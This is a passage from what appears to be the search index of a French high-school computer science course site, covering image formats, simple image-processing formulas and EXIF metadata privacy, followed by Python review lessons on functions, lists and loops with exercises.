d'images","text":"<p>\ud83d\udcd6 D\u00e9finitions</p> <p>Une extension est une suite de caract\u00e8res pr\u00e9c\u00e9d\u00e9e d'un point qui identifie le type de fichier. Le format correspond \u00e0 la m\u00e9thode d'encodage des donn\u00e9es pour leur stockage et leur lecture.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_3_Metadonnees/#principaux-formats-dimage","title":"\ud83d\uddc2\ufe0f Principaux formats d'image","text":"Format Extension Compression Transparence Usage principal JPEG .jpg, .jpeg Avec perte Non Photos, web, r\u00e9seaux sociaux PNG .png Sans perte Oui Logos, illustrations, graphiques GIF .gif Sans perte Oui Animations, images simples BMP .bmp Aucune Non Images brutes, \u00e9dition WebP .webp Avec/sans perte Oui Web moderne, optimisation <p>Activit\u00e9 : Formats et usages</p> <p>Reliez chaque format \u00e0 son usage optimal :</p> <p></p> <p>Compl\u00e9tez les usages principaux : - JPEG : ___ - PNG : ___ - GIF : _____</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_3_Metadonnees/#algorithmes-de-traitement-dimages","title":"\ud83d\udcd6 Algorithmes de traitement d'images","text":""},{"location":"seconde/V_-_Photographie_Numerique/c_3_Metadonnees/#conversion-en-niveaux-de-gris","title":"\ud83c\udfa8 Conversion en niveaux de gris","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>La conversion en niveaux de gris transforme une image couleur en image monochrome, utile pour l'analyse d'image, la calibration d'appareils ou l'optimisation de stockage.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_3_Metadonnees/#methodes-de-conversion","title":"\ud83d\udd22 M\u00e9thodes de conversion","text":"M\u00e9thode Formule Avantages Inconv\u00e9nients Moyenne <code>(R + V + B) / 3</code> Simple, rapide Peu r\u00e9aliste Luminance <code>0,2126\u00d7R + 0,7152\u00d7V + 0,0722\u00d7B</code> Respecte la vision humaine Plus complexe Composante verte <code>Valeur du vert</code> Tr\u00e8s rapide Approximation grossi\u00e8re <p>Info</p> <p>La m\u00e9thode de luminance utilise les coefficients de sensibilit\u00e9 de l'\u0153il humain d\u00e9finis par la norme ITU-R BT.709.</p> <p>Exemple avec l'image de Maya :</p> <p></p>"},{"location":"seconde/V_-_Photographie_Numerique/c_3_Metadonnees/#inversion-dimage-negatif","title":"\ud83d\udd04 Inversion d'image (n\u00e9gatif)","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>L'inversion d'image cr\u00e9e un n\u00e9gatif en soustrayant chaque composante de couleur \u00e0 la valeur maximale (255).</p> <p>Formule : <code>Nouvelle_valeur = 255 - Ancienne_valeur</code></p> <p></p> <p>Note</p> <p>Cette technique \u00e9tait fondamentale en photographie argentique, o\u00f9 les n\u00e9gatifs \u00e9taient invers\u00e9s chimiquement pour obtenir l'image finale.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_3_Metadonnees/#algorithmes-de-prise-de-vue","title":"\ud83d\udcf7 Algorithmes de prise de vue","text":""},{"location":"seconde/V_-_Photographie_Numerique/c_3_Metadonnees/#stabilisation-dimage","title":"\ud83c\udfaf Stabilisation d'image","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>La stabilisation d'image utilise des algorithmes pour compenser les mouvements involontaires du photographe et r\u00e9duire le flou de boug\u00e9.</p> Type de stabilisation Principe Efficacit\u00e9 Optique D\u00e9placement de lentilles Tr\u00e8s \u00e9lev\u00e9e Num\u00e9rique Traitement logiciel Mod\u00e9r\u00e9e Capteur D\u00e9placement du capteur \u00c9lev\u00e9e <p></p>"},{"location":"seconde/V_-_Photographie_Numerique/c_3_Metadonnees/#mise-au-point-automatique","title":"\ud83d\udd0d Mise au point automatique","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>L'autofocus ajuste automatiquement la distance focale pour obtenir une image nette du sujet vis\u00e9.</p> <p>M\u00e9thodes principales : - D\u00e9tection de contraste : Analyse du contraste pour trouver la nettet\u00e9 maximale - D\u00e9tection de phase : Utilise des capteurs d\u00e9di\u00e9s pour mesurer la distance</p> <p></p>"},{"location":"seconde/V_-_Photographie_Numerique/c_3_Metadonnees/#metadonnees-exif","title":"\ud83d\udcd6 M\u00e9tadonn\u00e9es EXIF","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>Les m\u00e9tadonn\u00e9es sont des donn\u00e9es qui d\u00e9crivent d'autres donn\u00e9es. Pour les images, le standard EXIF (Exchangeable Image File Format) stocke automatiquement des informations lors de la prise de vue.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_3_Metadonnees/#types-de-metadonnees-exif","title":"\ud83d\udcca Types de m\u00e9tadonn\u00e9es EXIF","text":"Cat\u00e9gorie Informations stock\u00e9es Exemples G\u00e9olocalisation Coordonn\u00e9es GPS, lieu, date/heure Latitude: 48.8566\u00b0N, Longitude: 2.3522\u00b0E Techniques Poids, r\u00e9solution, dimensions 4032\u00d73024 pixels, 2.1 Mo Appareil Marque, mod\u00e8le, objectif Canon EOS R5, 24-70mm f/2.8 Prise de vue Ouverture, vitesse, ISO f/2.8, 1/125s, ISO 400 Auteur Nom, copyright, titre \u00a9 2024 Photographe, \"Coucher de soleil\""},{"location":"seconde/V_-_Photographie_Numerique/c_3_Metadonnees/#consultation-des-metadonnees","title":"\ud83d\udd0d Consultation des m\u00e9tadonn\u00e9es","text":"<p>Exemple avec l'image de Maya :</p> <p></p> <p>Warning</p> <p>Les m\u00e9tadonn\u00e9es peuvent r\u00e9v\u00e9ler des informations personnelles (localisation, mat\u00e9riel utilis\u00e9). Il est important de les supprimer avant publication sur les r\u00e9seaux sociaux.</p> <p>Activit\u00e9 : Analyse de m\u00e9tadonn\u00e9es</p> <p>1. Analysez les m\u00e9tadonn\u00e9es d'une photo prise avec votre smartphone 2. Identifiez quelles informations pourraient poser des probl\u00e8mes de confidentialit\u00e9 3. Recherchez comment supprimer les m\u00e9tadonn\u00e9es avant partage</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_3_Metadonnees/#enjeux-et-perspectives","title":"\ud83d\udd2e Enjeux et perspectives","text":""},{"location":"seconde/V_-_Photographie_Numerique/c_3_Metadonnees/#vie-privee-et-securite","title":"\ud83d\udee1\ufe0f Vie priv\u00e9e et s\u00e9curit\u00e9","text":"<p>Les m\u00e9tadonn\u00e9es soul\u00e8vent des questions importantes : - G\u00e9olocalisation : r\u00e9v\u00e9lation involontaire de lieux priv\u00e9s - Tra\u00e7abilit\u00e9 : identification du mat\u00e9riel et des habitudes - Authentification : v\u00e9rification de l'origine des images</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_3_Metadonnees/#evolutions-technologiques","title":"\ud83d\ude80 \u00c9volutions technologiques","text":"<p>Les nouvelles technologies enrichissent les m\u00e9tadonn\u00e9es : - Intelligence artificielle : reconnaissance automatique d'objets et de personnes - Blockchain : certification et tra\u00e7abilit\u00e9 des images - R\u00e9alit\u00e9 augment\u00e9e : ajout d'informations contextuelles</p>"},{"location":"terminale/terminale/","title":"Terminale","text":"Terminale NSI <p>Num\u00e9rique et Sciences Informatiques</p> <p>             Approfondissement et sp\u00e9cialisation en informatique         </p> Navigation par Cat\u00e9gories <p>Explorez les diff\u00e9rents domaines de la Terminale NSI</p> \u2039 \ud83e\uddf1 Structures &amp; Algorithmes <p>                         Structures de donn\u00e9es avanc\u00e9es, algorithmes complexes et optimisation                     </p> Structures de donn\u00e9es \ud83d\udccb Listes \ud83d\udcda Piles \ud83d\udeb6 Files \ud83c\udf33 Parcours d'arbres \ud83d\udd0d ABR \ud83d\udd78\ufe0f Graphes Algorithmes avanc\u00e9s \u26a1 Diviser pour r\u00e9gner \ud83c\udfaf Prog. dynamique \ud83d\udd0d Recherche textuelle Exercices structures \ud83d\udcdd Listes \ud83d\udcdd Piles/Files \ud83d\udcdd Arbres \ud83d\udcdd Graphes \ud83d\udd27 Programmation Avanc\u00e9e <p>                         R\u00e9cursivit\u00e9, programmation orient\u00e9e objet, paradigmes et modularit\u00e9                     </p> Concepts avanc\u00e9s \ud83d\udd04 \u00c9xercices R\u00e9cursivit\u00e9 Paradigmes de programmation \ud83c\udfa8 Paradigmes \u2699\ufe0f Interpr\u00e9tation \ud83d\udd04 R\u00e9cursivit\u00e9 Exercices programmation \ud83d\udcdd R\u00e9cursivit\u00e9 \ud83d\udcdd POO \ud83d\udcdd Diviser pour r\u00e9gner \ud83c\udf10 Donn\u00e9es &amp; Graphes <p>                         Bases de donn\u00e9es relationnelles, SQL et traitement de donn\u00e9es complexes                     </p> Bases de donn\u00e9es \ud83d\uddc3\ufe0f Mod\u00e8le relationnel \ud83d\udcbe SQL \ud83d\udcdd Exercices SQL Structures avanc\u00e9es \ud83d\udcd6 Dictionnaires \ud83d\udcdd Exercices dict. \ud83d\udcdd Prog. dynamique \ud83d\udda5\ufe0f Syst\u00e8mes &amp; R\u00e9seaux <p>                         Architecture mat\u00e9rielle, processeurs, syst\u00e8mes sur puce et protocoles r\u00e9seau                     </p> Architecture mat\u00e9rielle \u2699\ufe0f Processeurs \ud83d\udd27 Syst\u00e8mes sur puce \ud83d\udd04 Gestion processus R\u00e9seaux &amp; Protocoles \ud83c\udf10 Protocoles routage \u203a"},{"location":"terminale/I-Rappels/Cours/fonctions/","title":"Fonctions","text":""},{"location":"terminale/I-Rappels/Cours/fonctions/#objectifs","title":"Objectifs","text":"<p>Rappeler la d\u00e9finition, l'utilisation et l'importance des fonctions en programmation.</p>"},{"location":"terminale/I-Rappels/Cours/fonctions/#definition-dune-fonction","title":"D\u00e9finition d'une fonction","text":""},{"location":"terminale/I-Rappels/Cours/fonctions/#syntaxe-de-base","title":"Syntaxe de base","text":"<pre><code>def nom_fonction(parametre1, parametre2):\n    \"\"\"Documentation de la fonction\"\"\"\n    # Corps de la fonction\n    resultat = parametre1 + parametre2\n    return resultat\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/fonctions/#fonction-simple-sans-parametre","title":"Fonction simple sans param\u00e8tre","text":"<pre><code>def dire_bonjour():\n    \"\"\"Affiche un message de salutation\"\"\"\n    print(\"Bonjour !\")\n\n# Appel de la fonction\ndire_bonjour()  # Affiche : Bonjour !\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/fonctions/#fonction-avec-parametres","title":"Fonction avec param\u00e8tres","text":"<pre><code>def calculer_aire_rectangle(longueur, largeur):\n    \"\"\"Calcule l'aire d'un rectangle\"\"\"\n    aire = longueur * largeur\n    return aire\n\n# Appel avec arguments\nresultat = calculer_aire_rectangle(5, 3)\nprint(f\"Aire : {resultat}\")  # Aire : 15\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/fonctions/#valeur-de-retour","title":"Valeur de retour","text":""},{"location":"terminale/I-Rappels/Cours/fonctions/#fonction-avec-return","title":"Fonction avec return","text":"<pre><code>def carre(nombre):\n    \"\"\"Retourne le carr\u00e9 d'un nombre\"\"\"\n    return nombre ** 2\n\nresultat = carre(4)\nprint(resultat)  # 16\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/fonctions/#fonction-sans-return-procedure","title":"Fonction sans return (proc\u00e9dure)","text":"<pre><code>def afficher_table(nombre, limite=10):\n    \"\"\"Affiche la table de multiplication\"\"\"\n    for i in range(1, limite + 1):\n        print(f\"{nombre} x {i} = {nombre * i}\")\n\nafficher_table(7, 5)\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/fonctions/#retour-multiple","title":"Retour multiple","text":"<pre><code>def diviser(dividende, diviseur):\n    \"\"\"Retourne le quotient et le reste\"\"\"\n    quotient = dividende // diviseur\n    reste = dividende % diviseur\n    return quotient, reste\n\nq, r = diviser(17, 5)\nprint(f\"17 \u00f7 5 = {q} reste {r}\")  # 17 \u00f7 5 = 3 reste 2\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/fonctions/#parametres","title":"Param\u00e8tres","text":""},{"location":"terminale/I-Rappels/Cours/fonctions/#parametres-obligatoires","title":"Param\u00e8tres obligatoires","text":"<pre><code>def presenter_personne(nom, prenom, age):\n    \"\"\"Pr\u00e9sente une personne\"\"\"\n    print(f\"Je m'appelle {prenom} {nom} et j'ai {age} ans.\")\n\npresenter_personne(\"Dupont\", \"Marie\", 17)\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/fonctions/#parametres-par-defaut","title":"Param\u00e8tres par d\u00e9faut","text":"<pre><code>def saluer(nom, formule=\"Bonjour\"):\n    \"\"\"Salue une personne avec une formule personnalisable\"\"\"\n    print(f\"{formule} {nom} !\")\n\nsaluer(\"Alice\")              # Bonjour Alice !\nsaluer(\"Bob\", \"Bonsoir\")     # Bonsoir Bob !\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/fonctions/#parametres-nommes","title":"Param\u00e8tres nomm\u00e9s","text":"<pre><code>def creer_profil(nom, age, ville=\"Paris\", profession=\"\u00c9tudiant\"):\n    \"\"\"Cr\u00e9e un profil utilisateur\"\"\"\n    return f\"{nom}, {age} ans, {profession} \u00e0 {ville}\"\n\n# Appel avec param\u00e8tres nomm\u00e9s\nprofil = creer_profil(nom=\"Alice\", age=17, ville=\"Lyon\")\nprint(profil)\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/fonctions/#portee-des-variables","title":"Port\u00e9e des variables","text":""},{"location":"terminale/I-Rappels/Cours/fonctions/#variables-locales","title":"Variables locales","text":"<pre><code>def ma_fonction():\n    x = 10  # Variable locale\n    print(f\"x dans la fonction : {x}\")\n\nma_fonction()\n# print(x)  # Erreur : x n'existe pas ici\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/fonctions/#variables-globales","title":"Variables globales","text":"<pre><code>y = 20  # Variable globale\n\ndef afficher_y():\n    print(f\"y dans la fonction : {y}\")\n\ndef modifier_y():\n    global y\n    y = 30\n    print(f\"y modifi\u00e9 : {y}\")\n\nafficher_y()  # y dans la fonction : 20\nmodifier_y()  # y modifi\u00e9 : 30\nprint(f\"y global : {y}\")  # y global : 30\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/fonctions/#fonctions-utiles","title":"Fonctions utiles","text":""},{"location":"terminale/I-Rappels/Cours/fonctions/#fonctions-mathematiques","title":"Fonctions math\u00e9matiques","text":"<pre><code>import math\n\ndef calculer_distance(x1, y1, x2, y2):\n    \"\"\"Calcule la distance entre deux points\"\"\"\n    return math.sqrt((x2 - x1)**2 + (y2 - y1)**2)\n\ndef factorielle(n):\n    \"\"\"Calcule la factorielle de n\"\"\"\n    if n &lt;= 1:\n        return 1\n    else:\n        return n * factorielle(n - 1)\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/fonctions/#fonctions-de-validation","title":"Fonctions de validation","text":"<pre><code>def est_pair(nombre):\n    \"\"\"V\u00e9rifie si un nombre est pair\"\"\"\n    return nombre % 2 == 0\n\ndef est_majeur(age):\n    \"\"\"V\u00e9rifie si une personne est majeure\"\"\"\n    return age &gt;= 18\n\ndef valider_email(email):\n    \"\"\"Validation simple d'un email\"\"\"\n    return \"@\" in email and \".\" in email\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/fonctions/#exercices-de-revision","title":"Exercices de r\u00e9vision","text":""},{"location":"terminale/I-Rappels/Cours/fonctions/#exercice-1-fonctions-mathematiques","title":"Exercice 1 : Fonctions math\u00e9matiques","text":"<p>\u00c9crire des fonctions pour : 1. Calculer le p\u00e9rim\u00e8tre et l'aire d'un cercle 2. Convertir des temp\u00e9ratures (Celsius \u2194 Fahrenheit) 3. Calculer la moyenne de trois notes 4. D\u00e9terminer si un nombre est premier</p>"},{"location":"terminale/I-Rappels/Cours/fonctions/#exercice-2-jeux-et-divertissement","title":"Exercice 2 : Jeux et divertissement","text":"<p>\u00c9crire des fonctions pour : 1. G\u00e9n\u00e9rer un mot de passe al\u00e9atoire 2. Jouer \u00e0 pierre-papier-ciseaux 3. Calculer l'\u00e2ge en jours 4. Convertir un nombre en lettres (1 \u2192 \"un\")</p>"},{"location":"terminale/I-Rappels/Cours/fonctions/#exercice-3-validation-et-traitement","title":"Exercice 3 : Validation et traitement","text":"<p>\u00c9crire des fonctions pour : 1. Valider un num\u00e9ro de t\u00e9l\u00e9phone 2. Compter les voyelles dans un mot 3. Inverser une cha\u00eene de caract\u00e8res 4. V\u00e9rifier si un mot est un palindrome</p>"},{"location":"terminale/I-Rappels/Cours/fonctions/#exercice-4-calculatrice-avancee","title":"Exercice 4 : Calculatrice avanc\u00e9e","text":"<p>Cr\u00e9er un programme avec des fonctions pour : 1. Addition, soustraction, multiplication, division 2. Puissance et racine carr\u00e9e 3. Calculs trigonom\u00e9triques 4. Menu interactif pour choisir l'op\u00e9ration</p>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/","title":"Listes et tableaux","text":""},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#objectifs","title":"Objectifs","text":"<p>Rappeler les concepts fondamentaux des listes en Python et leur manipulation.</p>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#creation-de-listes","title":"Cr\u00e9ation de listes","text":""},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#declaration-et-initialisation","title":"D\u00e9claration et initialisation","text":"<pre><code># Liste vide\nliste_vide = []\nliste_vide2 = list()\n\n# Liste avec des \u00e9l\u00e9ments\nnombres = [1, 2, 3, 4, 5]\nfruits = [\"pomme\", \"banane\", \"orange\"]\nmixte = [1, \"hello\", 3.14, True]\n\n# Liste avec r\u00e9p\u00e9tition\nzeros = [0] * 5  # [0, 0, 0, 0, 0]\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#creation-avec-range","title":"Cr\u00e9ation avec range()","text":"<pre><code># Convertir range en liste\nnombres = list(range(10))        # [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\npairs = list(range(0, 11, 2))    # [0, 2, 4, 6, 8, 10]\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#acces-aux-elements","title":"Acc\u00e8s aux \u00e9l\u00e9ments","text":""},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#indexation","title":"Indexation","text":"<pre><code>fruits = [\"pomme\", \"banane\", \"orange\", \"kiwi\"]\n\n# Index positifs\nprint(fruits[0])   # pomme (premier \u00e9l\u00e9ment)\nprint(fruits[1])   # banane\nprint(fruits[3])   # kiwi (dernier \u00e9l\u00e9ment)\n\n# Index n\u00e9gatifs\nprint(fruits[-1])  # kiwi (dernier \u00e9l\u00e9ment)\nprint(fruits[-2])  # orange (avant-dernier)\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#slicing-tranches","title":"Slicing (tranches)","text":"<pre><code>nombres = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\n\n# Syntaxe : liste[d\u00e9but:fin:pas]\nprint(nombres[2:5])      # [2, 3, 4]\nprint(nombres[:3])       # [0, 1, 2]\nprint(nombres[7:])       # [7, 8, 9]\nprint(nombres[::2])      # [0, 2, 4, 6, 8]\nprint(nombres[::-1])     # [9, 8, 7, 6, 5, 4, 3, 2, 1, 0]\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#modification-des-listes","title":"Modification des listes","text":""},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#modification-delements","title":"Modification d'\u00e9l\u00e9ments","text":"<pre><code>fruits = [\"pomme\", \"banane\", \"orange\"]\nfruits[1] = \"poire\"  # Remplace \"banane\" par \"poire\"\nprint(fruits)  # [\"pomme\", \"poire\", \"orange\"]\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#ajout-delements","title":"Ajout d'\u00e9l\u00e9ments","text":"<pre><code>fruits = [\"pomme\", \"banane\"]\n\n# Ajouter \u00e0 la fin\nfruits.append(\"orange\")\nprint(fruits)  # [\"pomme\", \"banane\", \"orange\"]\n\n# Ins\u00e9rer \u00e0 une position\nfruits.insert(1, \"poire\")\nprint(fruits)  # [\"pomme\", \"poire\", \"banane\", \"orange\"]\n\n# \u00c9tendre avec une autre liste\nfruits.extend([\"kiwi\", \"mangue\"])\nprint(fruits)  # [\"pomme\", \"poire\", \"banane\", \"orange\", \"kiwi\", \"mangue\"]\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#suppression-delements","title":"Suppression d'\u00e9l\u00e9ments","text":"<pre><code>fruits = [\"pomme\", \"banane\", \"orange\", \"kiwi\"]\n\n# Supprimer par valeur\nfruits.remove(\"banane\")\nprint(fruits)  # [\"pomme\", \"orange\", \"kiwi\"]\n\n# Supprimer par index\ndel fruits[1]\nprint(fruits)  # [\"pomme\", \"kiwi\"]\n\n# Supprimer et r\u00e9cup\u00e9rer le dernier \u00e9l\u00e9ment\ndernier = fruits.pop()\nprint(dernier)  # kiwi\nprint(fruits)   # [\"pomme\"]\n\n# Vider la liste\nfruits.clear()\nprint(fruits)  # []\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#parcours-de-listes","title":"Parcours de listes","text":""},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#parcours-simple","title":"Parcours simple","text":"<pre><code>fruits = [\"pomme\", \"banane\", \"orange\"]\n\n# Parcours des \u00e9l\u00e9ments\nfor fruit in fruits:\n    print(fruit)\n\n# Parcours avec index\nfor i in range(len(fruits)):\n    print(f\"{i}: {fruits[i]}\")\n\n# Parcours avec enumerate\nfor i, fruit in enumerate(fruits):\n    print(f\"{i}: {fruit}\")\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#parcours-avec-conditions","title":"Parcours avec conditions","text":"<pre><code>nombres = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\n\n# Afficher les nombres pairs\nfor nombre in nombres:\n    if nombre % 2 == 0:\n        print(nombre)\n\n# Compter les \u00e9l\u00e9ments &gt; 5\ncompteur = 0\nfor nombre in nombres:\n    if nombre &gt; 5:\n        compteur += 1\nprint(f\"Nombres &gt; 5 : {compteur}\")\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#methodes-utiles","title":"M\u00e9thodes utiles","text":""},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#recherche-et-test","title":"Recherche et test","text":"<pre><code>fruits = [\"pomme\", \"banane\", \"orange\", \"banane\"]\n\n# V\u00e9rifier la pr\u00e9sence\nprint(\"pomme\" in fruits)      # True\nprint(\"kiwi\" not in fruits)   # True\n\n# Trouver l'index\nindex = fruits.index(\"banane\")  # 1 (premi\u00e8re occurrence)\nprint(index)\n\n# Compter les occurrences\ncompteur = fruits.count(\"banane\")  # 2\nprint(compteur)\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#tri-et-organisation","title":"Tri et organisation","text":"<pre><code>nombres = [3, 1, 4, 1, 5, 9, 2, 6]\n\n# Trier la liste (modifie l'original)\nnombres.sort()\nprint(nombres)  # [1, 1, 2, 3, 4, 5, 6, 9]\n\n# Trier en ordre d\u00e9croissant\nnombres.sort(reverse=True)\nprint(nombres)  # [9, 6, 5, 4, 3, 2, 1, 1]\n\n# Cr\u00e9er une nouvelle liste tri\u00e9e\noriginale = [3, 1, 4, 1, 5]\ntriee = sorted(originale)\nprint(originale)  # [3, 1, 4, 1, 5] (inchang\u00e9e)\nprint(triee)      # [1, 1, 3, 4, 5]\n\n# Inverser l'ordre\nnombres.reverse()\nprint(nombres)\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#listes-en-comprehension","title":"Listes en compr\u00e9hension","text":""},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#syntaxe-de-base","title":"Syntaxe de base","text":"<pre><code># Cr\u00e9er une liste des carr\u00e9s\ncarres = [x**2 for x in range(10)]\nprint(carres)  # [0, 1, 4, 9, 16, 25, 36, 49, 64, 81]\n\n# Filtrer avec condition\npairs = [x for x in range(20) if x % 2 == 0]\nprint(pairs)  # [0, 2, 4, 6, 8, 10, 12, 14, 16, 18]\n\n# Transformer des cha\u00eenes\nmots = [\"python\", \"java\", \"javascript\"]\nmajuscules = [mot.upper() for mot in mots]\nprint(majuscules)  # [\"PYTHON\", \"JAVA\", \"JAVASCRIPT\"]\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#tableaux-a-deux-dimensions","title":"Tableaux \u00e0 deux dimensions","text":""},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#creation-et-manipulation","title":"Cr\u00e9ation et manipulation","text":"<pre><code># Matrice 3x3\nmatrice = [\n    [1, 2, 3],\n    [4, 5, 6],\n    [7, 8, 9]\n]\n\n# Acc\u00e8s aux \u00e9l\u00e9ments\nprint(matrice[1][2])  # 6 (ligne 1, colonne 2)\n\n# Parcours d'une matrice\nfor ligne in matrice:\n    for element in ligne:\n        print(element, end=\" \")\n    print()  # Nouvelle ligne\n\n# Parcours avec indices\nfor i in range(len(matrice)):\n    for j in range(len(matrice[i])):\n        print(f\"matrice[{i}][{j}] = {matrice[i][j]}\")\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#exercices-de-revision","title":"Exercices de r\u00e9vision","text":""},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#exercice-1-manipulation-de-base","title":"Exercice 1 : Manipulation de base","text":"<p>\u00c9crire des fonctions pour : 1. Trouver le maximum et minimum d'une liste 2. Calculer la moyenne d'une liste de nombres 3. Supprimer les doublons d'une liste 4. Fusionner deux listes tri\u00e9es</p>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#exercice-2-recherche-et-tri","title":"Exercice 2 : Recherche et tri","text":"<p>\u00c9crire des programmes pour : 1. Recherche lin\u00e9aire dans une liste 2. Tri par s\u00e9lection 3. Compter les occurrences de chaque \u00e9l\u00e9ment 4. Trouver le deuxi\u00e8me plus grand \u00e9l\u00e9ment</p>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#exercice-3-listes-de-listes","title":"Exercice 3 : Listes de listes","text":"<p>Travailler avec des matrices pour : 1. Additionner deux matrices 2. Transposer une matrice 3. Trouver la somme de chaque ligne 4. V\u00e9rifier si une matrice est sym\u00e9trique</p>"},{"location":"terminale/I-Rappels/Cours/listes_tableaux/#exercice-4-applications-pratiques","title":"Exercice 4 : Applications pratiques","text":"<p>Cr\u00e9er des programmes pour : 1. Gestionnaire de notes d'\u00e9l\u00e8ves 2. Inventaire de magasin 3. Carnet d'adresses simple 4. Jeu du pendu avec liste de mots</p>"},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/","title":"Structures conditionnelles et boucles","text":""},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/#objectifs","title":"Objectifs","text":"<p>Rappeler les structures de contr\u00f4le fondamentales : conditions et boucles.</p>"},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/#structures-conditionnelles","title":"Structures conditionnelles","text":""},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/#instruction-if-simple","title":"Instruction if simple","text":"<pre><code>age = int(input(\"Quel est votre \u00e2ge ? \"))\n\nif age &gt;= 18:\n    print(\"Vous \u00eates majeur\")\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/#instruction-ifelse","title":"Instruction if...else","text":"<pre><code>note = float(input(\"Entrez votre note : \"))\n\nif note &gt;= 10:\n    print(\"Admis\")\nelse:\n    print(\"Refus\u00e9\")\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/#instruction-ifelifelse","title":"Instruction if...elif...else","text":"<pre><code>note = float(input(\"Entrez votre note : \"))\n\nif note &gt;= 16:\n    print(\"Tr\u00e8s bien\")\nelif note &gt;= 14:\n    print(\"Bien\")\nelif note &gt;= 12:\n    print(\"Assez bien\")\nelif note &gt;= 10:\n    print(\"Passable\")\nelse:\n    print(\"Insuffisant\")\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/#conditions-composees","title":"Conditions compos\u00e9es","text":"<pre><code>age = 17\na_permis = True\n\nif age &gt;= 18 and a_permis:\n    print(\"Peut conduire seul\")\nelif age &gt;= 16 and a_permis:\n    print(\"Peut conduire accompagn\u00e9\")\nelse:\n    print(\"Ne peut pas conduire\")\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/#boucles","title":"Boucles","text":""},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/#boucle-for-avec-range","title":"Boucle for avec range()","text":"<pre><code># Afficher les nombres de 0 \u00e0 4\nfor i in range(5):\n    print(i)\n\n# Afficher les nombres de 1 \u00e0 10\nfor i in range(1, 11):\n    print(i)\n\n# Afficher les nombres pairs de 0 \u00e0 20\nfor i in range(0, 21, 2):\n    print(i)\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/#boucle-for-avec-des-sequences","title":"Boucle for avec des s\u00e9quences","text":"<pre><code># Parcourir une cha\u00eene\nmot = \"Python\"\nfor lettre in mot:\n    print(lettre)\n\n# Parcourir une liste\nfruits = [\"pomme\", \"banane\", \"orange\"]\nfor fruit in fruits:\n    print(fruit)\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/#boucle-while","title":"Boucle while","text":"<pre><code># Boucle while simple\ncompteur = 0\nwhile compteur &lt; 5:\n    print(f\"Compteur : {compteur}\")\n    compteur += 1\n\n# Boucle de saisie\nnombre = 0\nwhile nombre &lt;= 0:\n    nombre = int(input(\"Entrez un nombre positif : \"))\nprint(f\"Vous avez saisi : {nombre}\")\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/#instructions-break-et-continue","title":"Instructions break et continue","text":"<pre><code># break : sortir de la boucle\nfor i in range(10):\n    if i == 5:\n        break\n    print(i)  # Affiche 0, 1, 2, 3, 4\n\n# continue : passer \u00e0 l'it\u00e9ration suivante\nfor i in range(10):\n    if i % 2 == 0:\n        continue\n    print(i)  # Affiche 1, 3, 5, 7, 